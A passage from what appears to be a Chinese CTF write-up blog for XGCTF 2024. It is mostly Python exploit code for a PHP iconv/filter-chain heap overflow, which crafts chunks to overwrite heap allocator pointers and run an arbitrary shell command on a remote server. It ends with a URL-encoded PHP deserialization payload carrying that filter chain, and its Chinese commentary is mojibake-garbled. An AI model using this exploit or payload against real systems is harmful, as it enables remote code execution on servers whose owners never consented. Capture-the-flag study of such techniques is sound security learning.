number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121510526.png" alt="image-20240707121510526"></p><p>æ‰§è¡Œå¤±è´¥æ˜¯å› ä¸ºreadçš„å®½å­—èŠ‚æ³¨å…¥æ²¡é…å¹³</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121556868.png" alt="image-20240707121556868"></p><p>è‡ªå·±æµ‹è¯•åˆ°é…æˆ<code>O:</code>å¼€å¤´ä¸ºæ­¢ï¼Œç„¶åæ‰“å…¥æœ€åçš„payloadï¼ˆéœ€è¦urlç¼–ç ï¼‰ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>start<span class="token operator">=</span>aO<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>read<span class="token operator">%</span><span class="token number">5</span>Ffile<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>start<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>gxngxngxn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>filename<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1036<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>php<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fread<span class="token operator">%</span><span class="token number">3</span>Dzlib<span class="token operator">%</span><span class="token number">2</span>Einflate<span class="token operator">%</span><span class="token number">7</span>Czlib<span class="token operator">%</span><span class="token number">2</span>Einflate<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>EUTF<span class="token operator">%</span><span class="token number">2</span>D8<span class="token operator">%</span><span class="token number">2</span>EISO<span class="token operator">%</span><span class="token number">2</span>D2022<span class="token operator">%</span><span class="token number">2</span>DCN<span class="token operator">%</span><span class="token number">2</span>DEXT<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Equoted<span class="token operator">%</span><span class="token number">2</span>Dprintable<span class="token operator">%</span><span class="token number">2</span>Ddecode<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token 